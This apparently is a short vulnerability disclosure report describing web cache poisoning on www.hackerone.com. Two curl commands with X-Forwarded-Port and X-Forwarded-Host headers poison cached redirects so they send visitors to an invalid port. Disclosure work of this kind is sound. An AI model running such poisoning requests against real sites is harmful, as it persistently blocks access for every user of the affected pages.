Summary:

An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.

To replicate: 
```curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```
Then try to load https://www.hackerone.com/index.php?dontpoisoneveryone=1 in your browser.

This attack can also be done using the X-Forwarded-Host header:
```curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```
